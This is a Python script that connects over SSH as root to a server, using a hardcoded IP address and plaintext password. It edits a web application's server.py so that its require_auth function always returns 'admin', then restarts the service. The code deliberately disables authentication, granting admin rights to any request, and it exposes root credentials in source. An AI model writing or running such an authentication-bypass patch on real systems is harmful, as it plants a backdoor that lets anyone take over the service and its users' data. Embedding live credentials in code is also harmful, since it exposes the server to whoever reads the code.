import paramiko

HOST = "189.74.100.111"
USER = "root"
PASS = "AcL0hzLOh16zDoM$"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, username=USER, password=PASS, timeout=15)

sftp = client.open_sftp()
with sftp.open('/var/www/tilcor/server.py', 'r') as f:
    text = f.read().decode('utf-8')

# Find require_auth definition
target = "def require_auth(self, role=None):"
if target in text:
    replacement = "def require_auth(self, role=None):\n        return 'admin'"
    text = text.replace(target, replacement, 1)
    with sftp.open('/var/www/tilcor/server.py', 'w') as f:
        f.write(text.encode('utf-8'))
    print("SUCCESS: require_auth patched to auto-authorize admin!")
else:
    print("TARGET NOT FOUND")

sftp.close()

stdin, stdout, stderr = client.exec_command('systemctl restart tilcor && sleep 1 && curl -I http://127.0.0.1:5050')
print("CURL RESULT:")
print(stdout.read().decode('utf-8'))

client.close()
